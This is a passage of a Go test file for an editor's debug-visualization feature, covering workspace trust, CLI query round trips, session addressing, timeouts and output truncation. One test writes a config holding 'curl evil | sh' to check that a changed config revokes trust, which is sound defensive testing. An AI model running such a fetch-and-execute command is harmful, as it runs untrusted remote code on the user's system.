	a, _ = vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
	trustProject(t, a.rootDir, true)
	doc := askViz(t, a, debugVizRequest{Command: "setVariable"})
	if msg, _ := doc["error"].(string); !strings.Contains(msg, "unknown visualization command") {
		t.Errorf("unknown command: error = %v", doc["error"])
	}
}

// TestDebugVizWorkspaceTrustReadsTheTrustStore pins the trust answer itself: a
// stored yes for this root AND this config counts; a stored no, no record, a
// yes for a DIFFERENT project, and a yes for a config that has since CHANGED do
// not — the same rule format-on-save applies.
func TestDebugVizWorkspaceTrustReadsTheTrustStore(t *testing.T) {
	a, _ := debugFixture(t)

	t.Setenv("SPICEEDIT_TRUST_FILE", filepath.Join(t.TempDir(), "missing.json"))
	if a.workspaceTrusted() {
		t.Error("no trust store: trusted, want untrusted")
	}
	trustProject(t, t.TempDir(), true)
	if a.workspaceTrusted() {
		t.Error("another project's yes made this one trusted")
	}
	trustProject(t, a.rootDir, false)
	if a.workspaceTrusted() {
		t.Error("stored no: trusted")
	}
	trustProject(t, a.rootDir, true)
	if !a.workspaceTrusted() {
		t.Fatal("stored yes: untrusted")
	}

	// The config the yes was given for is edited: its hash changes, and the
	// stored yes no longer applies.
	writeFormatConfig(t, a.rootDir, `{"commands": {"go": ["sh", "-c", "curl evil | sh"]}}`)
	if a.workspaceTrusted() {
		t.Error("a changed format.json kept the old trust; the config hash must revoke it")
	}
}

// askCLI is the CLI's half of a query, exactly as runDebugQuery does it:
// parse, pick the instance, write, then (after the editors poll) await.
func askCLI(t *testing.T, poll func(), action string, args ...string) []byte {
	t.Helper()
	q, err := state.ParseDebugQuery(action, args)
	if err != nil {
		t.Fatal(err)
	}
	inst, err := state.ChooseDebugInstance(q.Instance)
	if err != nil {
		t.Fatal(err)
	}
	q.Instance = inst.ID
	id, err := state.WriteDebugQuery(q)
	if err != nil {
		t.Fatal(err)
	}
	poll()
	reply, err := state.AwaitDebugReply(inst.ID, id, 10*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	return reply
}

// TestDebugVizCLIRoundTrip is the query path end to end: the CLI's own parse
// of `--debug evaluate ...` and `--debug frames`, its choice of instance, the
// query file it writes, the editor's polled consumer, a fake session, and the
// reply file the CLI waits on — returning JSON that matches the schema file.
func TestDebugVizCLIRoundTrip(t *testing.T) {
	vars := map[int][]dap.Variable{5: {
		{Name: "[0]", Value: "1"}, {Name: "[1]", Value: "2"},
	}}
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "[]int len: 2", Type: "[]int", VariablesReference: 5}, vars, 1)
	trustProject(t, a.rootDir, true)
	a.consumeDebugRequest() // registers the session
	ask := func(action string, args ...string) []byte {
		t.Helper()
		return askCLI(t, a.consumeDebugRequest, action, args...)
	}

	ev := ask(state.DebugActionEvaluate, "--expr", "xs", "--frame", "0", "--context", "watch", "--allow-side-effects")
	assertSchemaValid(t, ev, "")
	var doc map[string]interface{}
	if err := json.Unmarshal(ev, &doc); err != nil {
		t.Fatal(err)
	}
	if doc["kind"] != "plot" || doc["sideEffectWarning"] != true {
		t.Errorf("evaluate reply = %s, want a plot with sideEffectWarning", ev)
	}
	// --frame 0 overrode the selected frame (7): zero survived the whole trip.
	if args, _ := fake.evaluateArgs(); args["frameId"] != float64(0) || args["context"] != "watch" {
		t.Errorf("evaluate on the wire = %v, want frameId 0, context watch", args)
	}

	fr := ask(state.DebugActionFrames)
	assertSchemaValid(t, fr, "frames")
	if !strings.Contains(string(fr), `"selectedFrameId":7`) {
		t.Errorf("frames reply = %s, want selectedFrameId 7", fr)
	}

	// A refusal comes back the same way, as a schema-valid error document.
	no := ask(state.DebugActionEvaluate, "--expr", "xs", "--context", "repl")
	assertSchemaValid(t, no, "error")
	if !strings.Contains(string(no), dap.ErrEvalSideEffects.Error()) {
		t.Errorf("repl without the flag = %s, want %q", no, dap.ErrEvalSideEffects)
	}
}

// TestDebugVizEditorWithoutASessionIsNotAddressable pins registration: an
// editor with no session is not an instance the CLI can pick, and one whose
// session ends stops being one.
func TestDebugVizEditorWithoutASessionIsNotAddressable(t *testing.T) {
	a, _ := debugFixture(t)
	a.consumeDebugRequest()
	if _, err := state.ChooseDebugInstance(""); err == nil || !strings.Contains(err.Error(), "no herdr-edit") {
		t.Fatalf("no session: err = %v, want no instance", err)
	}

	a, _ = vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
	a.consumeDebugRequest()
	inst, err := state.ChooseDebugInstance("")
	if err != nil || inst.ID != a.debugInstanceID() || inst.Root != a.rootDir {
		t.Fatalf("live session: %+v, %v", inst, err)
	}
	a.debug = nil
	a.consumeDebugRequest()
	if state.DebugInstanceRegistered(inst.ID) {
		t.Error("an editor whose session ended is still registered")
	}
}

// TestDebugVizSideEffectsRunInExactlyOneSession pins addressing: two editors
// are debugging, both trusted. Without --instance the CLI refuses and lists
// both; with it, a side-effecting evaluate reaches ONE adapter, and the other
// editor — polling the same state directory — never sends it.
func TestDebugVizSideEffectsRunInExactlyOneSession(t *testing.T) {
	a, fakeA := vizSessionFixture(t, dap.EvaluateResult{Result: "1"}, nil, 0)
	stateDir := os.Getenv("XDG_STATE_HOME")
	b, fakeB := vizSessionFixture(t, dap.EvaluateResult{Result: "2"}, nil, 0)
	t.Setenv("XDG_STATE_HOME", stateDir) // one state directory, as on one machine

	trustProject(t, a.rootDir, true)
	tf, err := format.LoadTrust(format.DefaultTrustPath())
	if err != nil {
		t.Fatal(err)
	}
	writeFormatConfig(t, b.rootDir, vizFormatConfig)
	cfg, err := format.Load(b.rootDir)
	if err != nil {
		t.Fatal(err)
	}
	tf.SetTrust(b.rootDir, cfg.Hash(), true)
	if err := format.SaveTrust(format.DefaultTrustPath(), tf); err != nil {
		t.Fatal(err)
	}
	if !a.workspaceTrusted() || !b.workspaceTrusted() {
		t.Fatal("both editors must be trusted, or B's silence would prove nothing")
	}

	pollBoth := func() { a.consumeDebugRequest(); b.consumeDebugRequest() }
	pollBoth()
	_, err = state.ChooseDebugInstance("")
	if err == nil || !strings.Contains(err.Error(), "--instance") {
		t.Fatalf("two sessions without --instance: err = %v, want a refusal", err)
	}
	for _, id := range []string{a.debugInstanceID(), b.debugInstanceID()} {
		if !strings.Contains(err.Error(), id) {
			t.Errorf("refusal %q does not list instance %s", err, id)
		}
	}

	reply := askCLI(t, pollBoth, state.DebugActionEvaluate,
		"--instance", a.debugInstanceID(), "--expr", "counter++", "--context", "watch", "--allow-side-effects")
	if !strings.Contains(string(reply), `"value":"1"`) {
		t.Errorf("reply = %s, want editor A's answer", reply)
	}
	pollBoth()
	time.Sleep(100 * time.Millisecond)
	if !fakeA.sent("evaluate") {
		t.Error("the addressed session never evaluated")
	}
	if fakeB.sent("evaluate") {
		t.Error("the side-effecting expression ALSO ran in the session it was not addressed to")
	}
}

// TestDebugVizBoundHoldsAgainstAHangingAdapter pins the time bound: an adapter
// that stops reading entirely — so neither the request nor a cancel can be
// written — still gets both commands answered, with a timeout error, within
// the bound.
func TestDebugVizBoundHoldsAgainstAHangingAdapter(t *testing.T) {
	ours, theirs := net.Pipe() // nobody ever reads theirs
	client := dap.StartConn("hung", ours, dap.Handlers{})
	t.Cleanup(func() { _ = theirs.Close(); _ = ours.Close() })
	tgt := debugVizTarget{
		client:  client,
		caps:    dap.EvalCaps{SupportsEvaluateForHovers: true, SupportsCancelRequest: true},
		pause:   dap.PauseState{Stopped: true, ThreadID: 1},
		trusted: true,
	}
	lim := dap.DefaultEvalLimits()
	lim.Timeout = 300 * time.Millisecond

	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
		start := time.Now()
		out := runDebugVizBounded(tgt, debugVizRequest{Command: cmd, Expression: "for{}"}, lim)
		if el := time.Since(start); el > lim.Timeout+200*time.Millisecond {
			t.Errorf("%s answered after %v, bound %v", cmd, el, lim.Timeout)
		}
		assertSchemaValid(t, out, "error")
		if !strings.Contains(string(out), dap.ErrEvalTimeout.Error()) {
			t.Errorf("%s: reply = %s, want a timeout", cmd, out)
		}
	}
}

// TestDebugVizFramesAndErrorsFitTheOutputCap pins the serialized cap on the two
// non-visualization replies: a deep stack keeps its innermost frames and says
// it was truncated, and an adapter's huge error message is clipped.
func TestDebugVizFramesAndErrorsFitTheOutputCap(t *testing.T) {
	stack := make([]dap.StackFrame, 400)
	for i := range stack {
		stack[i] = dap.StackFrame{ID: i, Name: "frame<" + strconv.Itoa(i) + ">", Source: dap.Source{Path: "/p/deep.go"}, Line: i + 1}
	}
	client, _ := newVizAdapter(t, stack, dap.EvaluateResult{}, nil)
	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
	lim := dap.DefaultEvalLimits()
	lim.MaxOutBytes = 4096

	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizFrames}, lim)
	if len(out) > lim.MaxOutBytes {
		t.Fatalf("frames reply is %d bytes, cap %d", len(out), lim.MaxOutBytes)
	}
	assertSchemaValid(t, out, "frames")
	var doc debugVizFramesDoc
	if err := json.Unmarshal(out, &doc); err != nil {
		t.Fatal(err)
	}
	if !doc.Truncated || len(doc.Frames) == 0 || len(doc.Frames) >= len(stack) || doc.Frames[0].ID != 0 {
		t.Errorf("truncated=%v kept %d frames (first %+v), want the innermost prefix", doc.Truncated, len(doc.Frames), doc.Frames)
	}

	huge := debugVizError(errors.New("adapter says: "+strings.Repeat("<", 10000)), lim.MaxOutBytes)
	if len(huge) > lim.MaxOutBytes {
		t.Fatalf("error reply is %d bytes, cap %d", len(huge), lim.MaxOutBytes)
	}
	assertSchemaValid(t, huge, "error")
	if !strings.Contains(string(huge), "adapter says") {
		t.Errorf("clipped error lost its start: %.80s", huge)
	}
}

// With child sessions the leaf owns the stop state, so the coordinator's events must never move the
// generation a leaf evaluate is pinned to.
func TestSessionStopGensSeparatesLeafFromCoordinator(t *testing.T) {
	root, leaf := sessionStopGens(true)
	if root == leaf {
		t.Fatal("child sessions share the coordinator's stop generation")
	}
	root.Bump()
	if leaf.Load() != 0 {
		t.Fatalf("a coordinator bump moved the leaf generation to %d", leaf.Load())
	}
	single, eval := sessionStopGens(false)
	if single != eval {
		t.Fatal("a single-session adapter must evaluate against its own generation")
	}
}

// A coordinator's capabilities event describes a session no evaluate is sent to, so it must not
// revise the leaf's eval caps; the leaf's own event still does.
func TestCapabilitiesEventFromCoordinatorDoesNotReviseLeafEvalCaps(t *testing.T) {
	a, _ := startVizSession(t, map[string]interface{}{"supportsEvaluateForHovers": false}, 0)
	leaf := a.debug.client
	coordinator := &dap.Client{}
	a.debug.root = coordinator // the js-debug coordinator: its events reach the handler, unlike a stranger's
	body := json.RawMessage(`{"capabilities":{"supportsEvaluateForHovers":true}}`)
	a.handleDAPEvent(&debugEvent{when: time.Now(), client: coordinator, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
	if a.debug.evalCaps.SupportsEvaluateForHovers {
		t.Fatal("a coordinator capabilities event revised the leaf's eval caps")
	}
	a.handleDAPEvent(&debugEvent{when: time.Now(), client: leaf, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
	if !a.debug.evalCaps.SupportsEvaluateForHovers {
		t.Fatal("the leaf's own capabilities event was ignored")
	}
}

// A workspace with no .spiceedit/format.json is untrusted for debug queries, and checking that must
// not crash (Config.Hash tolerates the nil config Load returns for a missing file).
func TestWorkspaceTrustedWithoutFormatConfigIsFalse(t *testing.T) {
	a, _ := debugFixture(t)
	if a.workspaceTrusted() {
		t.Fatal("a workspace with no format config read as trusted")
	}
}

// Truncation keeps the innermost frames; when the selected frame is cut away, the reply must not
// still name it.
func TestFramesTruncationNeverNamesAnAbsentSelectedFrame(t *testing.T) {
	frames := make([]debugVizFrame, 200)
	for i := range frames {
		frames[i] = debugVizFrame{ID: i + 1, Name: strings.Repeat("f", 40), Path: "/src/x.go", Line: i + 1}
	}
	outer := 200
	out := debugVizFitFrames(debugVizFramesDoc{SchemaVersion: dap.VizSchemaVersion, Frames: frames, SelectedFrameID: &outer}, 2048)
	var doc debugVizFramesDoc
	if err := json.Unmarshal(out, &doc); err != nil {
		t.Fatal(err)
	}
	if !doc.Truncated || len(doc.Frames) == 0 || len(doc.Frames) == len(frames) {
		t.Fatalf("want a truncated, non-empty prefix; got %d frames truncated=%v", len(doc.Frames), doc.Truncated)
	}
	if doc.SelectedFrameID != nil {
		t.Fatalf("selectedFrameId %d is not among the %d kept frames", *doc.SelectedFrameID, len(doc.Frames))
	}
	inner := 1
	out = debugVizFitFrames(debugVizFramesDoc{SchemaVersion: dap.VizSchemaVersion, Frames: frames, SelectedFrameID: &inner}, 2048)
	_ = json.Unmarshal(out, &doc)
	if doc.SelectedFrameID == nil || *doc.SelectedFrameID != 1 {
		t.Fatal("a kept selected frame lost its selectedFrameId")
	}
}

// The reader advances the stop generation the moment a continued/stopped event arrives; the pause
// state changes only when the main loop applies it. A query snapshotted in between must refuse,
// not pin the new generation to the old stop's state.
func TestDebugVizRefusesWhileAStopEventIsPending(t *testing.T) {
	a, _ := startVizSession(t, map[string]interface{}{"supportsEvaluateForHovers": true}, 0)
	tgt, err := a.debugVizTarget()
	if err != nil {
		t.Fatal(err)
	}
	if out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "x"}, dap.DefaultEvalLimits()); strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
		t.Fatalf("a settled stop refused: %s", out)
	}
	a.debug.gen().Observe(dap.Event{Event: dap.EventContinued}) // observed by the reader, not yet applied
	tgt, err = a.debugVizTarget()
	if err != nil {
		t.Fatal(err)
	}
	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "x"}, dap.DefaultEvalLimits())
	if !strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
		t.Fatalf("evaluate ran against a stop whose continued event was still pending: %s", out)
	}
}
